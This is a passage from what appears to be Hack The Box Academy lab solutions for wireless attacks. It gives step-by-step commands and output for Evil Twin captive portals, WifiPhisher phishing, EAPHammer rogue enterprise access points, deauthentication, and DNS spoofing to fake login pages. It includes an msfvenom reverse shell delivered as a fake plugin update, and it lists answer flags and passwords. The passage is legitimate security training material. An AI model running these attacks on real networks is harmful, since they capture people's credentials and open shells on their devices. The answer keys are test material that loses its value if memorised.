*Hint* To perform an Evil Twin attack you'll need to be very close to the target AP or have a very powerful wifi antenna. Your signal must reach clients equally strong or more than the legitimate AP 
--------- 

Do you want to spoof your MAC address during this attack? [y/N] 
> N
This attack requires that you have previously a WPA/WPA2 network captured Handshake file 

If you don't have a captured Handshake file from the target network you can get it now 
--------- 

Do you already have a captured Handshake file? Answer yes ("y") to enter the path or answer no ("n") to capture a new one now [y/N] 
> N

Type value in seconds (10-100) for timeout or press [Enter] to accept the proposal [20]: 
> 10

Timeout set to 10 seconds 

Two windows will be opened. One with the Handshake capturer and other with the attack to force clients to reconnect 

Don't close any window manually, script will do when needed. In about 10 seconds maximum you'll know if you've got the Handshake 
Press [Enter] key to continue...
```

Once the handshake is captured, press `Enter` to accept the default paths for both the capture file and the password file.

```
In addition to capturing a Handshake, it has been verified that a PMKID from the target network has also been successfully captured 

Congratulations!! 

Type the path to store the file or press [Enter] to accept the default proposal [/root/handshake-52:CD:8C:79:AD:87.cap] 
> 
The path is valid and you have write permissions. Script can continue... 

Capture file generated successfully at [/root/handshake-52:CD:8C:79:AD:87.cap] 
Press [Enter] key to continue...

BSSID set to 52:CD:8C:79:AD:87 

Channel set to 1 

ESSID set to HTB-Wireless 

If the password for the wifi network is achieved with the captive portal, you must decide where to save it. Type the path to store the file or press [Enter] to accept the default proposal [/root/evil_twin_captive_portal_password-HTB-Wireless.txt] 
> 
The path is valid and you have write permissions. Script can continue... 
Press [Enter] key to continue...
```

Choose `Option 1 - English` for the language, then select `N` to move on without using the advanced captive portal. Finally, press `Enter` to continue the attack.

```
Choose the language in which network clients will see the captive portal: 
--------- 
1.  Return to Evil Twin attacks menu 
--------- 
2.  English 
3.  Spanish 
4.  French 
5.  Catalan 
6.  Portuguese 
7.  Russian 
8.  Greek 
9.  Italian 
10.  Polish 
11. German 
12. Turkish 
13. Arabic 
14. Chinese 
--------- 
*Hint* In order to use the Evil Twin just AP and sniffing attacks, you must have another one interface in addition to the wifi network interface will become the AP, which will provide internet access to other clients on the network. This doesn't need to be wifi, can be ethernet 
--------- 
> 1

The captive portal language has been established 

Instead of the old neutral captive portal (used by default), an advanced one can be generated including a vendor logo based on target AP's BSSID. Bear in mind that this could be suspicious depending on the environment and the kind of victim. Do you want to use the advanced captive portal? [y/N] 
> N

Remember that the captive portal can also be customized for a more tailored attack. Check information about how to do it at Wiki: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/FAQ%20&%20Troubleshooting#can-the-evil-twin-captive-portal-page-be-customized-if-so-how 

All parameters and requirements are set. The attack is going to start. Multiple windows will be opened, don't close anyone. When you want to stop the attack press [Enter] on this window and the script will automatically close them all 
Press [Enter] key to continue...
```

After pressing enter, six new tabs will open as the attack begins. When the victim connects to the rogue AP and submits their credentials, the tabs will close and students will see the following message.

![[HTB Solutions/Others/z. images/00e4da8fa8866beb0d5c5ad37b084a47_MD5.jpg]]

Students need to press `Enter` to return to the main menu. Then, students need to open a new terminal tab and inspect the contents of the password file.

Code: shell

```shell
cat /root/evil_twin_captive_portal_password-HTB-Wireless.txt
```

```
root@twins:~# cat /root/evil_twin_captive_portal_password-HTB-Wireless.txt 

2025-03-06
airgeddon. Captive portal Evil Twin attack captured password

BSSID: 52:CD:8C:79:AD:87
Channel: 1
ESSID: HTB-Wireless

---------------

Password: {hidden}

---------------

If you enjoyed the script and found it useful, you can support the project by making a donation. Through PayPal (v1s1t0r.1s.h3r3@gmail.com) or sending a fraction of cryptocurrency (Bitcoin, Ethereum, Litecoin...). Any amount, no matter how small (1, 2, 5 $/€) is welcome. More information and direct links to do it at: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Contributing
```

Answer: `SuperS3cretP4ssw0rd123`

# Using WifiPhisher

## Question 1

### "Perform the Firmware Upgrade phishing as demonstrated in this section. What is the password obtained from the client?"

Students need to connect to the target machine using remote desktop protocol, authenticating as `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-4]─[10.10.14.139]─[htb-ac-594497@htb-fvtk5nch2h]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.109 /u:wifi /p:wifi /dynamic-resolution 

[11:06:43:215] [72597:72598] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[11:06:44:616] [72597:72598] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[11:06:44:616] [72597:72598] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[11:06:44:643] [72597:72598] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[11:06:44:643] [72597:72598] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[11:06:44:643] [72597:72598] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Then, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@twins:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    179 avahi-daemon
    193 wpa_supplicant
    198 avahi-daemon
    215 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
phy4	wlan2		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Now, students need to use `airodump-ng` to scan for wireless networks, providing the `-w` option to save the scan results.

Code: shell

```shell
sudo airodump-ng wlan0mon -w HTB -c 1
```

```
wifi@twins:~$ sudo airodump-ng wlan0mon -w HTB -c 1

17:15:04  Created capture file "HTB-01.cap".

 CH  1 ][ Elapsed: 30 s ][ 2025-03-06 17:15 ]
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -28   0      461      123    0   1   54   WPA2 TKIP   PSK  HTB-Wireless                                                                                                                      

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 52:CD:8C:79:AD:87  02:00:00:00:01:00  -29   54 -54      0       90                                                                                                                                               
 (not associated)   02:00:00:00:03:00  -49    0 - 1      0        2                                                                                                                                               
 (not associated)   02:00:00:00:04:00  -49    0 - 1      0        2    
```

To execute the Firmware Upgrade Phishing attack effectively, a valid handshake of the victim's Wi-Fi network is needed. Therefore, students need to open a new terminal tab, and subsequently use `aireplay-ng` to deauthenticate the `HTB-Wireless` access point.

Code: shell

```shell
sudo aireplay-ng --deauth 5 -a 52:CD:8C:79:AD:87 wlan0mon
```

```
wifi@twins:~$ sudo aireplay-ng --deauth 5 -a 52:CD:8C:79:AD:87 wlan0mon

17:18:50  Waiting for beacon frame (BSSID: 52:CD:8C:79:AD:87) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
17:18:51  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
17:18:51  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
17:18:52  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
17:18:52  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
17:18:52  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
```

Students need to check the output of `airodump-ng` to see if the handshake was captured.

```
 CH  1 ][ Elapsed: 3 mins ][ 2025-03-06 17:20 ][ ][ WPA handshake: 52:CD:8C:79:AD:87       
```

After confirming that the handshake was captured, students need to exit `airodump-ng`, then turn off monitor mode on `wlan0mon`.

Code: shell

```shell
sudo airmon-ng stop wlan0mon
```

```
wifi@twins:~$ sudo airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy2	wlan0mon	mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 station mode vif enabled on [phy2]wlan0)
		(mac80211 monitor mode vif disabled for [phy2]wlan0mon)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
phy4	wlan2		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Now, students need to use `wifiphisher` to perform the Firmware Upgrade Phishing attack.

Code: shell

```shell
sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade --handshake-capture HTB-01.cap -kN
```

```
wifi@twins:~$ sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade --handshake-capture HTB-01.cap -kN

Authorization required, but no authorization protocol specified
[*] Starting Wifiphisher 1.4GIT ( https://wifiphisher.org ) at 2025-03-06 17:40
[+] Timezone detected. Setting channel range to 1-13
[+] Selecting wlan1 interface for the deauthentication attack
[+] Selecting wlan0 interface for creating the rogue Access Point
<SNIP>
```

Students need to press `Enter` to select the `HTB-Wireless` network as the target.

![[HTB Solutions/Others/z. images/1964c3d71f728406205f40a56bf979ad_MD5.jpg]]

After a few moments, the victim will connect to the rogue AP, then subsequently authenticate to the phishing site.

Code: session

```
Extensions feed:                                                                 | Wifiphisher 1.4GIT
DEAUTH/DISAS - 02:00:00:00:04:00                                                 | ESSID: HTB-Wireless
DEAUTH/DISAS - 02:00:00:00:01:00                                                 | Channel: 1
WAITING FOR WPA KEY POST (ESSID: HTB-Wireless)                                   | AP interface: wlan0
Victim 2:0:0:0:1:0 probed for WLAN with ESSID: '' (KARMA)                        | Options: [Esc] Quit
                                                                                 |_____________________________
Connected Victims: 
02:00:00:00:01:00       10.0.0.23       Unknown

HTTP requests: 
[*] GET request from 10.0.0.23 for http://anything.com:8080/
[*] POST request from 10.0.0.23 with password={hidden}=Sign In
```

Checking the logged HTTP requests, students will find the client's password in plaintext.

Answer: `F1rMwareUPgrad3`

# Using WifiPhisher

## Question 2

### "Perform the Plugin Update phishing as demonstrated in this section to compromise the client. What is the value of flag.txt?"

From the previously established RDP session, students need to reset the network interfaces on the target VM.

Code: shell

```shell
sudo systemctl restart NetworkManager
```

```
wifi@twins:~$ sudo systemctl restart NetworkManager
```

Next, students need to use `msfvenom` to generate a payload for the Plugin Update phishing attack.

Code: shell

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
```

```
wifi@twins:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

Would you like to use and setup a new database (recommended)? Y
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Subsequently, students need to start a netcat listener.

Code: shell

```shell
nc -lvnp 4444
```

```
wifi@twins:~$ nc -lvnp 4444

Listening on 0.0.0.0 4444
```

From a new terminal tab, students need to launch `wifiphisher`, selecting the `plugin_update` attack and specifying the `shell.elf` file as the payload.

Code: shell

```shell
sudo wifiphisher -aI wlan0 -eI wlan1 -p plugin_update  --payload-path /home/wifi/shell.elf -kN
```

```
wifi@twins:~$ sudo wifiphisher -aI wlan0 -eI wlan1 -p plugin_update  --payload-path /home/wifi/shell.elf -kN
Authorization required, but no authorization protocol specified
Authorization required, but no authorization protocol specified
[*] Starting Wifiphisher 1.4GIT ( https://wifiphisher.org ) at 2025-03-06 18:42
[+] Timezone detected. Setting channel range to 1-13
[+] Selecting wlan1 interface for the deauthentication attack
[+] Selecting wlan0 interface for creating the rogue Access Point
```

Students need to press `Enter` to select the `HTB-Wireless` network as the target.

![[HTB Solutions/Others/z. images/1964c3d71f728406205f40a56bf979ad_MD5.jpg]]

While attack runs, students need to keep an eye on their netcat listener. When the victim connects to the rogue AP and downloads the payload from the fake Plugin Update site, a reverse shell will be executed. `Note: This attack may need to be ran multiple times before it is successful.`

```
Listening on 0.0.0.0 4444

Connection received on 10.0.0.23 41862
```

Once the reverse shell is established, students need to quickly examine the contents of the `flag.txt` file.

```
Listening on 0.0.0.0 4444

Connection received on 10.0.0.23 41862
cat flag.txt
HTB{hidden}
```

Answer: `HTB{Cli1nt_C0mpromIs3}`

# Using EAPHammer

## Question 1

### "Perform the ESSID Stripping attack and submit the password obtained for the user HTB\\Admin ."

To begin, students need to connect to the target machine with remote desktop protocol, authenticating as `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-4]─[10.10.14.139]─[htb-ac-594497@htb-fvtk5nch2h]─[~]
└──╼ [★]$ xfreerdp /v:10.129.233.163 /u:wifi /p:wifi /dynamic-resolution 

[13:16:21:806] [260692:260693] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[13:16:21:107] [260692:260693] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[13:16:21:107] [260692:260693] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Once connected, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@HTB-Corp:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    179 avahi-daemon
    193 wpa_supplicant
    198 avahi-daemon
    215 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
phy4	wlan2		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Now, students need to use `airodump-ng` to scan for wireless networks.

Code: shell

```shell
sudo airodump-ng wlan0mon
```

```
wifi@HTB-Corp:~$ sudo airodump-ng wlan0mon

 CH 11 ][ Elapsed: 1 min ][ 2025-03-06 20:22

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 54:8C:A0:E8:DF:B1  -28       54        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp                                                                                                                              
 00:11:22:33:44:00  -28       54        0    0   1   54   WPA2 CCMP   MGT  HTB-Corp.                                                                                                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Students will discover a single wireless network, `HTB-Corp` . Based off the `airodump-ng` output, students will know that that `HTB-Corp` is using WPA2 Enterprise. Therefore, it is likely that any Evil Twin / rogue access point will require a certificate.

To automate the creation of such a certificate, students need to launch `eaphammer`, providing the `--cert-wizard` option.

Code: shell

```shell
sudo /opt/eaphammer/eaphammer --cert-wizard
```

```
wifi@HTB-Corp:~$ sudo /opt/eaphammer/eaphammer --cert-wizard

<SNIP>
[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Please enter two letter country code for certs (i.e. US, FR)
: US
[*] Please enter state or province for certs (i.e. Ontario, New Jersey)
: California
[*] Please enter locale for certs (i.e. London, Hong Kong)
: San Francisco
[*] Please enter organization for certs (i.e. Evil Corp)
: Hack The Box
[*] Please enter org unit for certs (i.e. Hooman Resource Says)
: HTB
[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)
: admin@htb.com
[*] Please enter common name (CN) for certs.
: HTB
[CW] Creating CA cert and key pair...
[CW] Complete!
```

Once the certificates have been created, students can proceed with the attack. Using `eaphammer`, students launch a rogue access point. Additionally, students need to implement ESSID stripping by way of the tab `\t` character.

Code: shell

```shell
sudo /opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid HTB-Corp --creds --negotiate balanced  --essid-stripping '\t'
```

```
wifi@HTB-Corp:~$ sudo /opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid HTB-Corp --creds --negotiate balanced  --essid-stripping '\t'

<SNIP>

[hostapd] AP starting...

Configuration file: /opt/eaphammer/tmp/hostapd-2025-03-06-20-14-11-kE9R0eVavka3AC00ztJ1LVKIOxVQQsFe.conf
rfkill: Cannot open RFKILL control device
wlan1: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan1 with hwaddr 00:11:22:33:44:00 and ssid "HTB-Corp\t"
random: Only 16/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state COUNTRY_UPDATE->ENABLED
wlan1: AP-ENABLED 

Press enter to quit...
```

Students need to open a new terminal to perform deauthentication. `Note that the MAC address of the client may be different than the example shown below.`

Code: shell

```shell
sudo aireplay-ng --deauth 5 -a 54:8C:A0:E8:DF:B1 -c <CLIENT_MAC> wlan0mon
```

```
wifi@HTB-Corp:~$ sudo aireplay-ng --deauth 5 -a 54:8C:A0:E8:DF:B1 -c CA:B9:B8:80:BB:B2 wlan0mon

20:25:23  Waiting for beacon frame (BSSID: 54:8C:A0:E8:DF:B1) on channel 1
20:25:24  Sending 64 directed DeAuth (code 7). STMAC: [CA:B9:B8:80:BB:B2] [ 0| 0 ACKs]
20:25:24  Sending 64 directed DeAuth (code 7). STMAC: [CA:B9:B8:80:BB:B2] [ 0| 0 ACKs]
20:25:25  Sending 64 directed DeAuth (code 7). STMAC: [CA:B9:B8:80:BB:B2] [ 0| 0 ACKs]
20:25:25  Sending 64 directed DeAuth (code 7). STMAC: [CA:B9:B8:80:BB:B2] [ 0| 0 ACKs]
20:25:26  Sending 64 directed DeAuth (code 7). STMAC: [CA:B9:B8:80:BB:B2] [ 0| 0 ACKs]
```

When the victim attempts to reconnect, they unknowingly connect to the student's rogue AP. Upon checking the output from `eaphammer`, students will find the victim's password in plaintext.

```
<SNIP>
wlan1: STA ca:b9:b8:80:bb:b2 IEEE 802.11: authenticated
wlan1: STA ca:b9:b8:80:bb:b2 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED ca:b9:b8:80:bb:b2
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

GTC: Thu Mar  6 20:25:27 2025
	 username:	HTB\Admin
	 password:	{hidden}
wlan1: CTRL-EVENT-EAP-FAILURE ca:b9:b8:80:bb:b2
wlan1: STA ca:b9:b8:80:bb:b2 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan1: STA ca:b9:b8:80:bb:b2 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan1: STA ca:b9:b8:80:bb:b2 IEEE 802.11: deauthenticated due to local deauth request
```

Answer: `S3pt3mBer`

# DNS Spoofing (Attack)

## Question 1

### "Perform DNS spoofing on the domain academy.hackthebox.com as demonstrated in this section. What is the password obtained for the user jerry?"

To begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.15.111]─[htb-ac-594497@htb-llmhupro9r]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.147 /u:wifi /p:wifi /dynamic-resolution 

[19:10:13:709] [6209:6210] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[19:10:14:111] [6209:6210] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[19:10:14:111] [6209:6210] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[19:10:14:137] [6209:6210] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd

<SNIP>
```

Next, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@twins:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    193 wpa_supplicant
    204 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Once enabled, students need to use `airodump-ng` to scan for wireless networks.

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1
```

```
wifi@twins:~$ sudo airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 1 min ][ 2025-03-07 00:13 ][ Are you sure you want to quit? Press Q again to quit.

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -28   0     1167      100    1   1   54   WPA2 TKIP   PSK  HTB-Wireless                                                                                                                      

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 52:CD:8C:79:AD:87  36:A2:5E:D7:10:95  -29   54 -54      0       72         HTB-Wireless                                                                                                                          
 (not associated)   02:00:00:00:03:00  -49    0 - 1      9        4 
```

Based on the output, students will identify the target network as `HTB-Wirless`. Next, students need to configure Apache so that it can handle multiple phishing pages. Therefore, students must set up the Academy vhost.

Code: shell

```shell
sudo sh -c 'cat << EOF > /etc/apache2/sites-available/intranet1.conf
<VirtualHost *:80>
    ServerAdmin admin@hackthebox.com
    ServerName academy.hackthebox.com
    ServerAlias www.academy.hackthebox.com
    DocumentRoot /var/www/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF'
```

```
wifi@twins:~$ sudo sh -c 'cat << EOF > /etc/apache2/sites-available/intranet1.conf
<VirtualHost *:80>
    ServerAdmin admin@hackthebox.com
    ServerName academy.hackthebox.com
    ServerAlias www.academy.hackthebox.com
    DocumentRoot /var/www/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF'
```

Then, students need to configure the Facebook vhost.

Code: shell

```shell
sudo sh -c 'cat << EOF > /etc/apache2/sites-available/intranet2.conf
<VirtualHost *:80>
    ServerAdmin admin@facebook.com
    ServerName facebook.com
    ServerAlias www.facebook.com
    DocumentRoot /var/www/html/facebook
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF'
```

```
wifi@twins:~$ sudo sh -c 'cat << EOF > /etc/apache2/sites-available/intranet2.conf
<VirtualHost *:80>
    ServerAdmin admin@facebook.com
    ServerName facebook.com
    ServerAlias www.facebook.com
    DocumentRoot /var/www/html/facebook
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF'
```

After creating these files, students need to enable the vhosts by running the following commands:

Code: shell

```shell
sudo a2ensite intranet1.conf
sudo a2ensite intranet2.conf
sudo systemctl restart apache2
```

```
wifi@twins:~$ sudo a2ensite intranet1.conf

Enabling site intranet1.
To activate the new configuration, you need to run:
  systemctl reload apache2

wifi@twins:~$ sudo a2ensite intranet2.conf

Enabling site intranet2.
To activate the new configuration, you need to run:
  systemctl reload apache2

wifi@twins:~$ sudo systemctl restart apache2
```

With the vhosts now enabled, students need to proceed to the DNS spoofing attack using `wifipumpkin3`.

Code: shell

```shell
sudo wifipumpkin3
```

```
wifi@twins:~$ sudo wifipumpkin3

<SNIP>

                            .,'
                        .''.'
                        .' .'
            _.ood0Pp._ ,'  \`.~ .q?00doo._
        .od00Pd0000Pdb._. . _:db?000b?000bo.
     .?000Pd0000Pd0000PdbMb?0000b?000b?0000b.
    .d0000Pd0000Pd0000Pd0000b?0000b?000b?0000b.
    d0000Pd0000Pd00000Pd0000b?00000b?0000b?000b.
    00000Pd0000Pd0000Pd00000b?00000b?0000b?0000b
    ?0000b?0000b?  WiFiPumpkin3  00Pd0000Pd0000P
    ?0000b?0000b?0000b?00000Pd00000Pd0000Pd000P
    \`?0000b?0000b?0000b?0000Pd0000Pd0000Pd000P'
     \`?000b?0000b?000b?0000Pd000Pd0000Pd000P
        \`~?00b?000b?000b?000Pd00Pd000Pd00P'
            \`~?0b?0b?000b?0Pd0Pd000PdP~'
                                     codename: Gao
by: @mh4x0f - P0cL4bs Team | version: 1.1.7 main
[*] Session id: 783ae366-fd46-11ef-aa29-86c679629ed8 

wp3 > 
```

After starting `wifipumpkin3`, students need to configure the rogue access point.

Code: shell

```shell
set interface wlan1
set ssid HTB-Corp
set proxy noproxy
ignore pydns_server
```

```
wp3 > set interface wlan1
wp3 > set ssid HTB-Corp
wp3 > set proxy noproxy
wp3 > ignore pydns_server
```

Next, students need to view the current settings configured for the rogue AP, then display the available modules.

Code: shell

```shell
ap
show
```

```
wp3 > ap

[*] Settings AccessPoint:
=========================

 bssid             | ssid         |   channel | interface   | interface_net   | status      | security   | hostapd_config
-------------------+--------------+-----------+-------------+-----------------+-------------+------------+------------------
 BC:F6:85:03:36:5B | HTB-Wireless |        11 | wlan1       | default         | not Running | false      | false

wp3 > show

[*] Available Modules:
======================

 Name                     | Description
--------------------------+-----------------------------------------------------
 misc.custom_captiveflask | Install custom captiveflask templates
 misc.extra_captiveflask  | Extra customs captiveflask templates
 spoof.dns_spoof          | Perform a dns spoof with accesspoint attack
 wifi.wifideauth          | Sends deauthentication packets to a wifi network AP
 wifi.wifiscan            | Scan WiFi networks and detect devices
```

Students need to select `spoof.dns_spoof` and configure it accordingly. Once the phishing domains and DNS redirect have been entered, students need to `start` the module.

Code: shell

```shell
use spoof.dns_spoof
set domains academy.hackthebox.com,facebook.com
set redirectTo 10.0.0.1
back
start
```

```
wp3 > use spoof.dns_spoof
wp3 : dns_spoof > set domains academy.hackthebox.com,facebook.com
wp3 : dns_spoof > set redirectTo 10.0.0.1
wp3 : dns_spoof > start

[*] DnsSpoof attack
===================

[*] Redirect to: 10.0.0.1 

[*] Targets:
============

[*] -> [academy.hackthebox.com] 
[*] -> [facebook.com] 
wp3 : dns_spoof > back
[*] module: dns_spoof running in background
[*] use jobs command displays the status of jobs started
wp3 > start
[+] enable forwarding in iptables...
[*] sharing internet connection with NAT...
[*] setting interface for sharing internet: eth0 
[+] starting hostpad pid: [2125]
wp3 > [+] hostapd is running
[*] starting pydhcp_server
[*] starting pydns_server port: 53
[*] starting sniffkin3 port: [80, 8080]
[+] sniffkin3 -> kerberos   activated
[+] sniffkin3 -> httpCap    activated
[+] sniffkin3 -> ftp        activated
[+] sniffkin3 -> emails     activated
[+] sniffkin3 -> hexdump    activated
```

Now, students need to deauthenticate the `HTB-Wireless` access point. `Note that the MAC addresses of the client and AP may differ than the example shown below.`

Code: shell

```shell
sudo aireplay-ng --deauth 10 -a 52:CD:8C:79:AD:87 -c 36:A2:5E:D7:10:95 wlan0mon
```

```
wifi@twins:~$ sudo aireplay-ng --deauth 10 -a 52:CD:8C:79:AD:87 -c 36:A2:5E:D7:10:95 wlan0mon

00:46:02  Sending 64 directed DeAuth (code 7). STMAC: [36:A2:5E:D7:10:95] [ 0| 0 ACKs]
00:46:03  Sending 64 directed DeAuth (code 7). STMAC: [36:A2:5E:D7:10:95] [ 0| 0 ACKs]
00:46:03  Sending 64 directed DeAuth (code 7). STMAC: [36:A2:5E:D7:10:95] [ 0| 0 ACKs]
<SNIP>
```

When students check the output of `wifipumpkin3`, they will find the username and password of the victim who logged into the fake `academy.hackthebox.com` page.

```
 [  sniffkin3  ] 00:46:53  - [ 10.0.0.21 > 10.0.0.1 ] GET academy.hackthebox.com/ 
 [  sniffkin3  ] 00:46:58  - [ 10.0.0.21 > 10.0.0.1 ] POST academy.hackthebox.com/data.php 
                     payload: _token=dLLTAsNEev8Lsnvedo0wsqk1KrRzfzMrjLkpE9IZ&email=jerry%40htb.com&password={hidden}
                     Username: jerry%40htb.com
                     Password: {hidden}
```

Answer: `j3rry123`

# DNS Spoofing (Attack)

## Question 2

### "Perform DNS spoofing on the domain facebook.com as demonstrated in this section. What is the password obtained for the user tom?"

Using the same `wifipumpkin3` process from the previous question, students need to continue to observe the output from the `dns_spoof` module.

```
 [  sniffkin3  ] 00:46:43  - [ 10.0.0.21 > 10.0.0.1 ] GET facebook.com/ 
 [  sniffkin3  ] 00:46:48  - [ 10.0.0.21 > 10.0.0.1 ] POST facebook.com/data.php 
                     payload: username=tom&userpassword={redacted}&data=Log+In
                     Username: tom
                     Password: {redacted}
```

Students will find the username and password of the victim who logged into the fake Facebook page.

Answer: `t0miscool`

# SSL Interception

## Question 1

### "Host the rogue AP with SSID "HTB-Wireless" and perform the SSL interception attack as demonstrated in this section. What is the discovered password?"

To begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-4]─[10.10.14.139]─[htb-ac-594497@htb-fvtk5nch2h]─[~]
